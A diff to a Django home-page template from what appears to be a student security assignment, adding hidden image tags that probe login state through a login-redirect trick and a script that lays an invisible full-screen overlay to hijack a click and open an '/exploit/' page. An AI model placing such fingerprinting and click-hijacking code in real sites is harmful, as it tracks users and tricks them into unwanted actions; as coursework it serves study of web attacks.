@@ -1,4 +1,5 @@
 {# CA1: CRUD Application #}
+{# CA3: Test and Security #}
 
 {% extends 'base.html' %}
 
@@ -6,6 +7,17 @@
 
 {% block content %}
     <h1>Welcome to Dorset Music Collection</h1>
+
+    {# comment/uncomment the image tags below to enable/disable each attempt of social media fingerprinting.  #}
+    {# first attempt should be successful if user is logged-in because it redirects to the favicon being served by the main server. #}
+    <img onload="exploit()"
+         src="https://www.dorsetmusiccollection.com:8000/accounts/login/?next=https://www.dorsetmusiccollection.com:8000/static/images/favicon_io/favicon.ico"
+         alt="local favicon" style="display: none">
+    {# second attempt should fail even if user is logged-in because it redirects to the favicon being served by the CDN. #}
+    <img onload="exploit()"
+         src="https://www.dorsetmusiccollection.com:8000/accounts/login/?next=https://cdn.dmc.net:9000/media/images/favicon_io/favicon.ico"
+         alt="cdn favicon" style="display: none">
+
     <br><br>
     <h3>Choose one of the currently available apps below:</h3>
     <br>
@@ -15,9 +27,26 @@
             <h5><a href="{% url 'polls:index' %}">Polls</a></h5>
         </li>
     </ul>
+
+    {# social media fingerprint exploit script #}
+    {# it creates an invisible HTML element that takes up the whole screen #}
+    {# and redirects to another page upon being clicked. #}
+    <script>
+        function exploit() {
+            const div = document.createElement('div');
+            div.style.zIndex = "100";
+            div.style.width = "100%";
+            div.style.height = "100%";
+            div.style.position = "fixed";
+            document.body.prepend(div);
+            div.addEventListener("click", () => {
+                window.open("https://www.dorsetmusiccollection.com:8000/exploit/")
+                div.remove();
+            })
+        }
+    </script>
 {% endblock %}
 {% block banner %}
-    {% load static %}
-    {# loads resource from project's general images directory #}
-    <img class="banner-image" src="{% static 'images/home-banner.jpg' %}" alt="music collection">
+    {# loads banner image from fake CDN #}
+    <img class="banner-image" src="https://cdn.dmc.net:9000/media/images/home-banner.jpg" alt="music collection">
 {% endblock %}
